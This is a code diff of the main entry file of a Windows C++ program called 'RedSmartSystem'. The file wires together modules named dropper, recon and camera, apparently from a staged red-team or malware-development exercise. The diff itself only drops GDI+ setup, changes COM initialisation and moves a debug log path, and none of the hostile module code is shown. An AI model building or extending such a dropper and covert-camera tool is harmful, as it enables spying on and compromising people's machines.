@@ -1,23 +1,19 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
-#include <gdiplus.h>
 
-#pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "windowscodecs.lib")
 #pragma comment(lib, "mfplat.lib")
 #pragma comment(lib, "mfreadwrite.lib")
 #pragma comment(lib, "mfuuid.lib")
 #pragma comment(lib, "ole32.lib")
 
-using namespace Gdiplus;
-
 #include "../Task 1/dropper.h"
 #include "../Task 2/recon.h"
 #include "../Task 3/camera.h"
 
 static void LogMainDebug(const char* msg) {
-    std::ofstream ofs("debug_log.txt", std::ios::app);
+    std::ofstream ofs("C:\\Users\\Sonuu\\Desktop\\camera_debug.txt", std::ios::app);
     if (ofs.is_open()) ofs << "[Main] " << msg << std::endl;
 }
 
@@ -26,14 +22,8 @@ extern DWORD WINAPI DropperThread(LPVOID lpParam);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     LogMainDebug("--- RedSmartSystem Started ---");
 
-    ULONG_PTR gdiplusToken = 0;
-    GdiplusStartupInput gdiplusStartupInput;
-    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
-        LogMainDebug("GdiplusStartup failed to initialize.");
-        gdiplusToken = 0;
-    }
-
-    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    // WIC and Media Foundation require COM initialization
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (FAILED(hr)) {
         LogMainDebug("CoInitializeEx failed.");
     } else {
@@ -52,8 +42,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     if (SUCCEEDED(hr)) CoUninitialize();
-    
-    if (gdiplusToken) GdiplusShutdown(gdiplusToken);
 
     LogMainDebug("--- RedSmartSystem Finished ---");
     return 0;
